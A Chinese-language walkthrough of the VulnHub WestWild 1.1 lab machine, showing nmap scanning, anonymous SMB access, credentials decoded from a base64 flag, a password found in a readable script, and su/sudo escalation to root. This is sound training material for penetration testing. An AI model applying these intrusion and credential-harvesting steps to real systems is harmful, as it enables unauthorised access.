# WESTWILD: 1.1主机渗透实现

- 靶机地址:https://www.vulnhub.com/entry/westwild-11,338/

- 下载地址:https://download.vulnhub.com/westwild/West-Wild-v1.1.ova

## 信息收集:

### 主机发现:

- 当前IP段:`192.168.2.0/24`,`192.168.2.2`

- ```shell
  └─$ sudo nmap -sn --min-rate 10000 192.168.2.1/24                                           
  [sudo] password for kali: 
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 22:34 EDT
  Nmap scan report for 192.168.2.1
  Host is up (0.0088s latency).
  MAC Address: 00:50:56:C0:00:01 (VMware)
  Nmap scan report for 192.168.2.13
  Host is up (0.00011s latency).
  MAC Address: 00:0C:29:02:1D:C6 (VMware)
  Nmap scan report for 192.168.2.254
  Host is up (0.000084s latency).
  MAC Address: 00:50:56:E4:FB:DB (VMware)
  Nmap scan report for 192.168.2.2
  Host is up.
  Nmap done: 256 IP addresses (4 hosts up) scanned in 13.39 seconds
  ```

- 靶机IP:`192.168.2.13`

### 端口扫描:

- TCP端口扫描

- ```shell
  └─$ sudo nmap -sT --min-rate 10000 -p- 192.168.2.13 -oA Nmap-scan/sT
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 22:34 EDT
  Nmap scan report for 192.168.2.13
  Host is up (0.00058s latency).
  Not shown: 65531 closed tcp ports (conn-refused)
  PORT    STATE SERVICE
  22/tcp  open  ssh
  80/tcp  open  http
  139/tcp open  netbios-ssn
  445/tcp open  microsoft-ds
  MAC Address: 00:0C:29:02:1D:C6 (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 9.46 seconds
  ```

- UDP端口扫描

- ```shell
  └─$ sudo nmap -sU --min-rate 10000 -p- 192.168.2.13 -oA Nmap-scan/sU
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 22:35 EDT
  Warning: 192.168.2.13 giving up on port because retransmission cap hit (10).
  Nmap scan report for 192.168.2.13
  Host is up (0.00077s latency).
  Not shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
  PORT    STATE SERVICE
  137/udp open  netbios-ns
  MAC Address: 00:0C:29:02:1D:C6 (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 79.59 seconds
  ```

### 服务及操作系统扫描

- ```shell
  └─$ sudo nmap -sC -sV -O -p22,80,139,445, 192.168.2.13 -oA Nmap-scan/sC         
  [sudo] password for kali: 
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 22:35 EDT
  Nmap scan report for 192.168.2.13
  Host is up (0.00044s latency).
  
  PORT    STATE SERVICE     VERSION
  22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   1024 6f:ee:95:91:9c:62:b2:14:cd:63:0a:3e:f8:10:9e:da (DSA)
  |   2048 10:45:94:fe:a7:2f:02:8a:9b:21:1a:31:c5:03:30:48 (RSA)
  |   256 97:94:17:86:18:e2:8e:7a:73:8e:41:20:76:ba:51:73 (ECDSA)
  |_  256 23:81:c7:76:bb:37:78:ee:3b:73:e2:55:ad:81:32:72 (ED25519)
  80/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
  |_http-title: Site doesn't have a title (text/html).
  |_http-server-header: Apache/2.4.7 (Ubuntu)
  139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp open              Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
  MAC Address: 00:0C:29:02:1D:C6 (VMware)
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Aggressive OS guesses: Linux 3.2 - 4.9 (98%), Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.13 - 3.16 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Linux 4.10 (94%), Android 5.0 - 6.0.1 (Linux 3.4) (94%), Linux 3.2 - 3.10 (94%), Linux 3.2 - 3.16 (94%), Linux 4.5 (93%)
  No exact OS matches for host (test conditions non-ideal).
  Network Distance: 1 hop
  Service Info: Host: WESTWILD; OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  Host script results:
  |_nbstat: NetBIOS name: WESTWILD, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required
  |_clock-skew: mean: 7h00m01s, deviation: 1h43m55s, median: 8h00m01s
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  | smb2-time: 
  |   date: 2023-08-23T10:35:43
  |_  start_date: N/A
  | smb-os-discovery: 
  |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
  |   Computer name: westwild
  |   NetBIOS computer name: WESTWILD\x00
  |   Domain name: \x00
  |   FQDN: westwild
  |_  System time: 2023-08-23T13:35:43+03:00
  
  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 31.87 seconds
  ```

### 默认脚本扫描

- ```shell
  └─$ sudo nmap --script=vuln -p22,80,139,445, 192.168.2.13 -oA Nmap-scan/Script
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 22:38 EDT
  Nmap scan report for 192.168.2.13
  Host is up (0.00037s latency).
  
  PORT    STATE SERVICE
  22/tcp  open  ssh
  80/tcp  open  http
  |_http-dombased-xss: Couldn't find any DOM based XSS.
  |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
  |_http-csrf: Couldn't find any CSRF vulnerabilities.
  | http-slowloris-check: 
  |   VULNERABLE:
  |   Slowloris DOS attack
  |     State: LIKELY VULNERABLE
  |     IDs:  CVE:CVE-2007-6750
  |       Slowloris tries to keep many connections to the target web server open and hold
  |       them open as long as possible.  It accomplishes this by opening connections to
  |       the target web server and sending a partial request. By doing so, it starves
  |       the http server's resources causing Denial Of Service.
  |       
  |     Disclosure date: 2009-09-17
  |     References:
  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
  |_      http://ha.ckers.org/slowloris/
  139/tcp open  netbios-ssn
  445/tcp open  microsoft-ds
  MAC Address: 00:0C:29:02:1D:C6 (VMware)
  
  Host script results:
  |_smb-vuln-ms10-054: false
  |_smb-vuln-ms10-061: false
  | smb-vuln-regsvc-dos: 
  |   VULNERABLE:
  |   Service regsvc in Microsoft Windows systems vulnerable to denial of service
  |     State: VULNERABLE
  |       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
  |       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
  |       while working on smb-enum-sessions.
  |_          
  
  Nmap done: 1 IP address (1 host up) scanned in 327.48 seconds
  ```

### SMB信息收集:

- 在服务扫描时发现smb共享目录,并且可以使用空密码进行连接,尝试连接并读取文件

- ![image-20230823104540136](https://raw.githubusercontent.com/r0o983/images/main/202308231045213.png)

- 连接共享目录文件夹`wave`

- ```shell
  └─$ smbclient '\\192.168.2.13\wave'   
  Password for [WORKGROUP\kali]:
  Try "help" to get a list of possible commands.
  smb: \> ls
    .                                   D        0  Tue Jul 30 01:18:56 2019
    ..                                  D        0  Thu Aug  1 19:02:20 2019
    FLAG1.txt                           N       93  Mon Jul 29 22:31:05 2019
    message_from_aveng.txt              N      115  Tue Jul 30 01:21:48 2019
  
                  1781464 blocks of size 1024. 285164 blocks available
  smb: \> mget *.*
  Get file FLAG1.txt? y
  getting file \FLAG1.txt of size 93 as FLAG1.txt (30.3 KiloBytes/sec) (average 30.3 KiloBytes/sec)
  Get file message_from_aveng.txt? y
  getting file \message_from_aveng.txt of size 115 as message_from_aveng.txt (56.1 KiloBytes/sec) (average 40.6 KiloBytes/sec)
  smb: \> ls
    .                                   D        0  Tue Jul 30 01:18:56 2019
    ..                                  D        0  Thu Aug  1 19:02:20 2019
    FLAG1.txt                           N       93  Mon Jul 29 22:31:05 2019
    message_from_aveng.txt              N      115  Tue Jul 30 01:21:48 2019
  
                  1781464 blocks of size 1024. 285160 blocks available
  
  ```

- 读取文件内容

- ```shell
  ┌──(kali㉿kali)-[~]
  └─$ cat FLAG1.txt 
  RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K
  
  ┌──(kali㉿kali)-[~]
  └─$ cat message_from_aveng.txt 
  Dear Wave ,
  Am Sorry but i was lost my password ,
  and i believe that you can reset  it for me . 
  Thank You 
  Aveng 
  ```

- 这个flag1,看起来有点奇怪...结合上下文,将内容进行base64解码操作;

- ```shell
  Flag1{Welcome_T0_THE-W3ST-W1LD-B0rder}
  user:wavex
  password:door+open
  ```

- 尝试使用ssh连接

## 获得初始shell

- 使用`flag1`内容解码后的账号进行ssh登录

- ```shell
  └─$ ssh wavex@192.168.2.13         
  The authenticity of host '192.168.2.13 (192.168.2.13)' can't be established.
  ED25519 key fingerprint is SHA256:oeuytnbnPest0/m/OtTQyjaFSRv03+EMhBmAX886bsk.
  This key is not known by any other names.
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '192.168.2.13' (ED25519) to the list of known hosts.
  wavex@192.168.2.13's password: 
  Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)
  
   * Documentation:  https://help.ubuntu.com/
  
    System information as of Wed Aug 23 13:32:06 +03 2023
  
    System load: 0.87              Memory usage: 4%   Processes:       174
    Usage of /:  77.9% of 1.70GB   Swap usage:   0%   Users logged in: 0
  
    Graph this data and manage this system at:
      https://landscape.canonical.com/
  
  Your Hardware Enablement Stack (HWE) is supported until April 2019.
  Last login: Fri Aug  2 02:00:40 2019
  wavex@WestWild:~$ whoami
  wavex
  wavex@WestWild:~$ uname -a
  Linux WestWild 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:28:33 UTC 2019 i686 i686 i686 GNU/Linux
  wavex@WestWild:~$ ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
      link/ether 00:0c:29:02:1d:c6 brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.13/24 brd 192.168.2.255 scope global eth0
         valid_lft forever preferred_lft forever
      inet6 fe80::20c:29ff:fe02:1dc6/64 scope link 
         valid_lft forever preferred_lft forever
  wavex@WestWild:~$ ls -lhai
  total 32K
  69673 drwxr-xr-x 4 wavex  wavex   4.0K Aug  2  2019 .
   7684 drwxr-xr-x 4 root   root    4.0K Jul 30  2019 ..
  69674 -rw-r--r-- 1 wavex  wavex    220 Jul 30  2019 .bash_logout
  66935 -rw-r--r-- 1 wavex  wavex   3.6K Jul 30  2019 .bashrc
  69882 drwx------ 2 wavex  wavex   4.0K Aug  2  2019 .cache
    611 -rw-r--r-- 1 wavex  wavex    675 Jul 30  2019 .profile
  69690 -rw------- 1 wavex  wavex    870 Aug  2  2019 .viminfo
  69679 drwxrwxrwx 2 nobody nogroup 4.0K Jul 30  2019 wave
  wavex@WestWild:~$ cd wave/
  wavex@WestWild:~/wave$ ls -lhai
  total 16K
  69679 drwxrwxrwx 2 nobody nogroup 4.0K Jul 30  2019 .
  69673 drwxr-xr-x 4 wavex  wavex   4.0K Aug  2  2019 ..
  66142 -rw-rw-r-- 1 wavex  wavex     93 Jul 30  2019 FLAG1.txt
  67816 -rw-r--r-- 1 wavex  wavex    115 Jul 30  2019 message_from_aveng.txt
  wavex@WestWild:~/wave$ sudo -l
  [sudo] password for wavex: 
  Sorry, user wavex may not run sudo on WestWild.
  wavex@WestWild:~/wave$ cat /etc/crontab 
  # /etc/crontab: system-wide crontab
  # Unlike any other crontab you don't have to run the `crontab'
  # command to install the new version when you edit this file
  # and files in /etc/cron.d. These files also have username fields,
  # that none of the other crontabs do.
  
  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  
  # m h dom mon dow user  command
  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  #
  wavex@WestWild:~/wave$ 
  ```

## 提权

- 查找当前用户组可写文件:`find / group wavex -type f 2>/dev/null -not -path "/proc/*"`

- ```shell
  wavex@WestWild:~$ find / -group wavex -type f 2>/dev/null  -not -path "/proc/*"
  /sys/fs/cgroup/systemd/user/1001.user/1.session/tasks
  /sys/fs/cgroup/systemd/user/1001.user/1.session/cgroup.procs
  /usr/share/av/westsidesecret/ififoregt.sh
  /home/wavex/.gnupg/trustdb.gpg
  /home/wavex/.gnupg/pubring.gpg
  /home/wavex/.gnupg/gpg.conf
  /home/wavex/.cache/motd.legal-displayed
  /home/wavex/wave/FLAG1.txt
  /home/wavex/wave/message_from_aveng.txt
  /home/wavex/.profile
  /home/wavex/.bashrc
  /home/wavex/.viminfo
  /home/wavex/.bash_logout
  /tmp/linpeas.sh
  /tmp/41458.c
  /tmp/l.sh
  /tmp/rh.sh
  wavex@WestWild:~$ cat /usr/share/av/westsidesecret/ififoregt.sh
   #!/bin/bash 
   figlet "if i foregt so this my way"
   echo "user:aveng"
   echo "password:kaizen+80"
   
  
  wavex@WestWild:~$ 
  ```

- 切换到aveng用户-->当前用户已经拥有root权限

- ```shell
  wavex@WestWild:~$ su aveng
  Password: 
  aveng@WestWild:/home/wavex$ sudo -l
  [sudo] password for aveng: 
  Matching Defaults entries for aveng on WestWild:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User aveng may run the following commands on WestWild:
      (ALL : ALL) ALL
  aveng@WestWild:/home/wavex$ sudo /bin/bash
  root@WestWild:/home/wavex# whoami
  root
  root@WestWild:/home/wavex# ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
      link/ether 00:0c:29:02:1d:c6 brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.13/24 brd 192.168.2.255 scope global eth0
         valid_lft forever preferred_lft forever
      inet6 fe80::20c:29ff:fe02:1dc6/64 scope link 
         valid_lft forever preferred_lft forever
  root@WestWild:/home/wavex# uname -a
  Linux WestWild 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:28:33 UTC 2019 i686 i686 i686 GNU/Linux
  root@WestWild:/home/wavex# cd ~
  root@WestWild:~# ls -lhai
  total 28K
  69176 dr-xr-xr-x 3 aveng aveng 4.0K Aug  2  2019 .
   7684 drwxr-xr-x 4 root  root  4.0K Jul 30  2019 ..
  13771 -rw-r--r-- 1 aveng aveng  220 Jul 30  2019 .bash_logout
  13504 -rw-r--r-- 1 aveng aveng 3.6K Jul 30  2019 .bashrc
  69632 drwx------ 2 aveng aveng 4.0K Jul 30  2019 .cache
    716 -rw-r--r-- 1 aveng aveng  675 Jul 30  2019 .profile
  69667 -rw------- 1 aveng aveng  511 Jul 30  2019 .viminfo
  root@WestWild:~# cd /root/
  root@WestWild:/root# ls -lhai
  total 36K
   7689 drwx------  3 root root 4.0K Aug  2  2019 .
      2 drwxr-xr-x 21 root root 4.0K Jul 30  2019 ..
   1097 -rw-r--r--  1 root root 3.1K Feb 20  2014 .bashrc
  69681 drwx------  2 root root 4.0K Jul 31  2019 .cache
  69869 -rw-r--r--  1 root root  122 Jul 31  2019 FLAG2.txt
   1098 -rw-r--r--  1 root root  140 Feb 20  2014 .profile
  69835 -rw-r--r--  1 root root   75 Jul 31  2019 .selected_editor
  69677 -rw-------  1 root root 4.9K Jul 31  2019 .viminfo
  root@WestWild:/root# cat FLAG2.txt 
  Flag2{Weeeeeeeeeeeellco0o0om_T0_WestWild}
  
  Great! take a screenshot and Share it with me in twitter @HashimAlshareff 
  
  
  root@WestWild:/root# 
  ```